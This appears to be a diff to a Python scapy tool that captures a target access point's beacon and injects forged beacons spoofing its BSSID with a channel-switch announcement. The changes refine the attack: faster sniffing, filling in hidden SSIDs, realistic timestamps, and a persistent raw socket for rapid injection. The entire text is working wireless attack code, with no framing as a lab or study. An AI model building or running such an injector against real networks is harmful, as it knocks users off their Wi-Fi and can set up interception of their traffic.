@@ -27,6 +27,7 @@ from scapy.all import (
     sniff as scapy_sniff,
 )
 from scapy.sendrecv import sendp
+from scapy.config import conf as scapy_conf
 
 STRIP_IE_IDS = frozenset({
     37,   # CSA
@@ -71,7 +72,7 @@ class BeaconTemplate:
 # Phase 1: Beacon acquisition
 # -------------------------------------------------------------------
 
-def sniff_beacon(iface, bssid, timeout=3.0, retries=3):
+def sniff_beacon(iface, bssid, timeout=0.3, retries=2):
     """Sniff with retries for stubborn APs."""
     target = bssid.lower()
 
@@ -169,15 +170,14 @@ def build_fallback_template(ssid: str, channel: int) -> BeaconTemplate:
     # Pairwise Count: 1, Pairwise: CCMP
     # AKM Count: 1, AKM: SAE (00-0F-AC:08)
     # RSN Capabilities: 0x00C0 (MFPC=1, MFPR=1)
-    rsn_body = struct.pack(
-        "<HI H I H I H",
-        1,            # version
-        0x000FAC04,   # group cipher: CCMP
-        1,            # pairwise count
-        0x000FAC04,   # pairwise: CCMP
-        1,            # AKM count
-        0x000FAC08,   # AKM: SAE
-        0x00C0,       # capabilities: MFPC + MFPR
+    rsn_body = (
+        struct.pack("<H", 1)
+        + b"\x00\x0f\xac\x04"
+        + struct.pack("<H", 1)
+        + b"\x00\x0f\xac\x04"
+        + struct.pack("<H", 1)
+        + b"\x00\x0f\xac\x08"
+        + struct.pack("<H", 0x00C0)
     )
     template.ies.append((48, rsn_body))
 
@@ -365,6 +365,11 @@ def inject(
         )
         template = build_fallback_template(ssid, channel)
     else:
+        for i, (ie_id, ie_info) in enumerate(template.ies):
+            if ie_id == 0 and (len(ie_info) == 0 or ie_info == b"\x00" * len(ie_info)):
+                template.ies[i] = (0, ssid.encode())
+                break
+
         vht_tag = "VHT" if template.has_vht else "HT"
         ie_count = len(template.ies)
         print(
@@ -374,7 +379,7 @@ def inject(
 
 
     tsf_base = template.timestamp
-    tsf_increment = template.beacon_interval * 1024
+    tsf_start_wall = time.time()
 
     seq_num = 0
     frame_count = 0
@@ -382,6 +387,7 @@ def inject(
     sustain_remaining = 0
     end_time = time.time() + duration
 
+    sock = scapy_conf.L2socket(iface=iface)
     try:
         while time.time() < end_time:
             if sustain_remaining > 0:
@@ -398,19 +404,19 @@ def inject(
                 template=template,
                 bssid=bssid,
                 seq_num=seq_num,
-                tsf=tsf_base + (frame_count * tsf_increment),
+                tsf=tsf_base + int((time.time() - tsf_start_wall) * 1_000_000),
                 target_channel=target_channel,
                 switch_count=switch_count,
             )
 
-            sendp(frame_bytes, iface=iface, verbose=False)
+            sock.send(frame_bytes)
             frame_count += 1
             seq_num += 1
 
             if rate > 0:
                 time.sleep(rate)
     finally:
-        pass
+        sock.close()
 
     return frame_count, template.source
 
